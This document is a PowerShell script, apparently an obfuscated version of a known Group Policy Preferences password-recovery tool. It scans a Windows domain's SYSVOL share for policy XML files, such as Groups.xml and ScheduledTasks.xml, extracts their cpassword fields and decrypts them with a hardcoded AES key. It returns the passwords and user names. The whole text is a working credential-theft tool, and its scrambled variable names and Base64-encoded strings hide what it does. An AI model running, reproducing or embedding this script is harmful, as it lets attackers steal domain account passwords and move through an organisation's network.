function invoke-functiongp {
    [CmdletBinding()]
    Param ()
    Set-StrictMode -Version 2
    function __/=\___/=\__/\_/= {
        [CmdletBinding()]
        Param (
            [string] ${____/=\/\/\_/====\} 
        )
        try {
            ${____/==\/\/==\/\/} = (${____/=\/\/\_/====\}.length % 4)
            switch (${____/==\/\/==\/\/}) {
            '1' {${____/=\/\/\_/====\} = ${____/=\/\/\_/====\}.Substring(0,${____/=\/\/\_/====\}.Length -1)}
            '2' {${____/=\/\/\_/====\} += ('=' * (4 - ${____/==\/\/==\/\/}))}
            '3' {${____/=\/\/\_/====\} += ('=' * (4 - ${____/==\/\/==\/\/}))}
            }
            ${/==\/=\/=\/===\__} = [Convert]::FromBase64String(${____/=\/\/\_/====\})
            ${_/=\/\____/\/\/\_} = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] ${_/=\_____/=\/\_/\} = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            ${_/\/\___/\/\____/} = New-Object Byte[](${_/=\/\____/\/\/\_}.IV.Length) 
            ${_/=\/\____/\/\/\_}.IV = ${_/\/\___/\/\____/}
            ${_/=\/\____/\/\/\_}.Key = ${_/=\_____/=\/\_/\}
            ${/=\____/=\/=\_/\/} = ${_/=\/\____/\/\/\_}.CreateDecryptor() 
            [Byte[]] ${___/\/===\__/\/==} = ${/=\____/=\/=\_/\/}.TransformFinalBlock(${/==\/=\/=\/===\__}, 0, ${/==\/=\/=\/===\__}.length)
            return [System.Text.UnicodeEncoding]::Unicode.GetString(${___/\/===\__/\/==})
        } 
        catch {Write-Error $Error[0]}
    }  
    function ______/\_/==\___/\ {
    [CmdletBinding()]
        Param (
            ${__/\_/\__/=\/=\__/} 
        )
        try {
            ${__/=\_/\_/\/=\__/} = Split-Path ${__/\_/\__/=\/=\__/} -Leaf
            [xml] ${/=\/\_/=\_/=\_/==} = Get-Content (${__/\_/\__/=\/=\__/})
            ${____/=\/\/\_/====\} = @()
            ${/=\/\/\/==\_/=\_/} = @()
            ${__/=\__/\/\/\/===} = @()
            ${/=\/\/=\/\/\/====} = @()
            ${/==\/=\/\____/\/\} = @()
            if (${/=\/\_/=\_/=\_/==}.innerxml -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHAAYQBzAHMAdwBvAHIAZAAqAA==')))){
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHQAZQBuAHQAaQBhAGwAIABwAGEAcwBzAHcAbwByAGQAIABpAG4AIAAkAHsAXwBfAC8AXABfAC8AXABfAF8ALwA9AFwALwA9AFwAXwBfAC8AfQA=')))
                switch (${__/=\_/\_/\/=\__/}) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAHMALgB4AG0AbAA='))) {
                        ${____/=\/\/\_/====\} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAFUAcwBlAHIALwBQAHIAbwBwAGUAcgB0AGkAZQBzAC8AQABjAHAAYQBzAHMAdwBvAHIAZAA='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/\/==\_/=\_/} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAFUAcwBlAHIALwBQAHIAbwBwAGUAcgB0AGkAZQBzAC8AQAB1AHMAZQByAE4AYQBtAGUA'))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${__/=\__/\/\/\/===} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAFUAcwBlAHIALwBQAHIAbwBwAGUAcgB0AGkAZQBzAC8AQABuAGUAdwBOAGEAbQBlAA=='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/=\/\/\/====} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAFUAcwBlAHIALwBAAGMAaABhAG4AZwBlAGQA'))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAC4AeABtAGwA'))) {  
                        ${____/=\/\/\_/====\} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBOAFQAUwBlAHIAdgBpAGMAZQBzAC8ATgBUAFMAZQByAHYAaQBjAGUALwBQAHIAbwBwAGUAcgB0AGkAZQBzAC8AQABjAHAAYQBzAHMAdwBvAHIAZAA='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/\/==\_/=\_/} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBOAFQAUwBlAHIAdgBpAGMAZQBzAC8ATgBUAFMAZQByAHYAaQBjAGUALwBQAHIAbwBwAGUAcgB0AGkAZQBzAC8AQABhAGMAYwBvAHUAbgB0AE4AYQBtAGUA'))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/=\/\/\/====} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBOAFQAUwBlAHIAdgBpAGMAZQBzAC8ATgBUAFMAZQByAHYAaQBjAGUALwBAAGMAaABhAG4AZwBlAGQA'))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAdABhAHMAawBzAC4AeABtAGwA'))) {
                        ${____/=\/\/\_/====\} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAHMALwBUAGEAcwBrAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAYwBwAGEAcwBzAHcAbwByAGQA'))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/\/==\_/=\_/} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAHMALwBUAGEAcwBrAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAcgB1AG4AQQBzAA=='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/=\/\/\/====} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAHMALwBUAGEAcwBrAC8AQABjAGgAYQBuAGcAZQBkAA=='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBTAG8AdQByAGMAZQBzAC4AeABtAGwA'))) { 
                        ${____/=\/\/\_/====\} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAGEAdABhAFMAbwB1AHIAYwBlAHMALwBEAGEAdABhAFMAbwB1AHIAYwBlAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAYwBwAGEAcwBzAHcAbwByAGQA'))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/\/==\_/=\_/} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAGEAdABhAFMAbwB1AHIAYwBlAHMALwBEAGEAdABhAFMAbwB1AHIAYwBlAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAdQBzAGUAcgBuAGEAbQBlAA=='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/=\/\/\/====} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAGEAdABhAFMAbwB1AHIAYwBlAHMALwBEAGEAdABhAFMAbwB1AHIAYwBlAC8AQABjAGgAYQBuAGcAZQBkAA=='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAC4AeABtAGwA'))) { 
                        ${____/=\/\/\_/====\} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBQAHIAaQBuAHQAZQByAHMALwBTAGgAYQByAGUAZABQAHIAaQBuAHQAZQByAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAYwBwAGEAcwBzAHcAbwByAGQA'))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/\/==\_/=\_/} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBQAHIAaQBuAHQAZQByAHMALwBTAGgAYQByAGUAZABQAHIAaQBuAHQAZQByAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAdQBzAGUAcgBuAGEAbQBlAA=='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/=\/\/\/====} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBQAHIAaQBuAHQAZQByAHMALwBTAGgAYQByAGUAZABQAHIAaQBuAHQAZQByAC8AQABjAGgAYQBuAGcAZQBkAA=='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAHMALgB4AG0AbAA='))) { 
                        ${____/=\/\/\_/====\} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAHIAaQB2AGUAcwAvAEQAcgBpAHYAZQAvAFAAcgBvAHAAZQByAHQAaQBlAHMALwBAAGMAcABhAHMAcwB3AG8AcgBkAA=='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/\/==\_/=\_/} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAHIAaQB2AGUAcwAvAEQAcgBpAHYAZQAvAFAAcgBvAHAAZQByAHQAaQBlAHMALwBAAHUAcwBlAHIAbgBhAG0AZQA='))) | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        ${/=\/\/=\/\/\/====} += , ${/=\/\_/=\_/=\_/==} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAHIAaQB2AGUAcwAvAEQAcgBpAHYAZQAvAEAAYwBoAGEAbgBnAGUAZAA='))) | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
           foreach (${___/\/\/\___/=\__} in ${____/=\/\/\_/====\}) {
               Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGMAcgB5AHAAdABpAG4AZwAgACQAewBfAF8AXwAvAFwALwBcAC8AXABfAF8AXwAvAD0AXABfAF8AfQA=')))
               ${__/=\_/=\/\/\__/\} = __/=\___/=\__/\_/= ${___/\/\/\___/=\__}
               Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGMAcgB5AHAAdABlAGQAIABhACAAcABhAHMAcwB3AG8AcgBkACAAbwBmACAAJAB7AF8AXwAvAD0AXABfAC8APQBcAC8AXAAvAFwAXwBfAC8AXAB9AA==')))
               ${/==\/=\/\____/\/\} += , ${__/=\_/=\/\/\__/\}
           }
            if (!(${/==\/=\/\____/\/\})) {${/==\/=\/\____/\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
            if (!(${/=\/\/\/==\_/=\_/})) {${/=\/\/\/==\_/=\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
            if (!(${/=\/\/=\/\/\/====})) {${/=\/\/=\/\/\/====} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
            if (!(${__/=\__/\/\/\/===})) {${__/=\__/\/\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
            ${__/=\____/=====\_} = @{'Passwords' = ${/==\/=\/\____/\/\};
                                  'UserNames' = ${/=\/\/\/==\_/=\_/};
                                  'Changed' = ${/=\/\/=\/\/\/====};
                                  'NewName' = ${__/=\__/\/\/\/===};
                                  'File' = ${__/\_/\__/=\/=\__/}}
            ${/=\___/\_/\_/\/\_} = New-Object -TypeName PSObject -Property ${__/=\____/=====\_}
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABwAGEAcwBzAHcAbwByAGQAIABpAHMAIABiAGUAdAB3AGUAZQBuACAAewB9ACAAYQBuAGQAIABtAGEAeQAgAGIAZQAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGUAIAB2AGEAbAB1AGUALgA=')))
            if (${/=\___/\_/\_/\/\_}) {Return ${/=\___/\_/\_/\/\_}} 
        }
        catch {Write-Error $Error[0]}
    }
    try {
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQAgAGkAcwAgAG4AbwB0ACAAYQAgAGQAbwBtAGEAaQBuACAAbQBlAG0AYgBlAHIAIABvAHIAIABVAHMAZQByACAAaQBzACAAbgBvAHQAIABhACAAbQBlAG0AYgBlAHIAIABvAGYAIAB0AGgAZQAgAGQAbwBtAGEAaQBuAC4A')))
        }
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIAB0AGgAZQAgAEQAQwAuACAAVABoAGkAcwAgAGMAbwB1AGwAZAAgAHQAYQBrAGUAIABhACAAdwBoAGkAbABlAC4A')))
        ${_/\_/\/=====\/===} = Get-ChildItem -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQARQBuAHYAOgBVAFMARQBSAEQATgBTAEQATwBNAEEASQBOAFwAUwBZAFMAVgBPAEwA'))) -Recurse -ErrorAction SilentlyContinue -Include $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAHMALgB4AG0AbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAdABhAHMAawBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBTAG8AdQByAGMAZQBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAHMALgB4AG0AbAA=')))
        if ( -not ${_/\_/\/=====\/===} ) {throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcAByAGUAZgBlAHIAZQBuAGMAZQAgAGYAaQBsAGUAcwAgAGYAbwB1AG4AZAAuAA==')))}
        Write-Verbose "Found $(${_/\_/\/=====\/===} | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
        foreach (${__/\_/\__/=\/=\__/} in ${_/\_/\/=====\/===}) {
            ${__/=\_/=\___/=\/=} = (______/\_/==\___/\ ${__/\_/\__/=\/=\__/}.Fullname)
            Write-Output ${__/=\_/=\___/=\/=}
        }
    }
    catch {Write-Error $Error[0]}
}